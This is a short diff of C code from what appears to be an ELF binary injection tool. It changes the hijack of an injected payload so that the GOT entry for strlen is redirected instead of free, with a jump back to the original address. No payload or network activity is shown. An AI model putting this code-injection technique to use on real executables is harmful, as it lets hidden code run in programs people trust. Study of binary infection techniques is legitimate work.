@@ -19,7 +19,7 @@ void insert(byte *dest, byte *src, uint64_t dest_size, uint16_t src_size) {
 
     byte *final_product = NULL;
     Elf64_Phdr *seg = get_exe_segment();
-    Elf64_Addr old_entry = get_entry_point();			// To use later
+    Elf64_Addr old_entry; // = get_entry_point();			// To use later
    
     /* First we find the section .text */
     Elf64_Shdr *text = get_section_by_name(".text");
@@ -28,6 +28,7 @@ void insert(byte *dest, byte *src, uint64_t dest_size, uint16_t src_size) {
     }
 
     Elf64_Addr new_entry = text->sh_addr + text->sh_size;
+    old_entry = change_got(new_entry, "strlen");
     add_jump(&src, &src_size, new_entry, old_entry);
 
     /* Then we find the segment that contains the text section */
@@ -39,7 +40,6 @@ void insert(byte *dest, byte *src, uint64_t dest_size, uint16_t src_size) {
 
     /* Now we update the entry point */
     // set_entry_point(new_entry);
-    change_got(new_entry, "free");
 
     update_symbol("_fini", src_size);
     update_section(".fini", src_size);
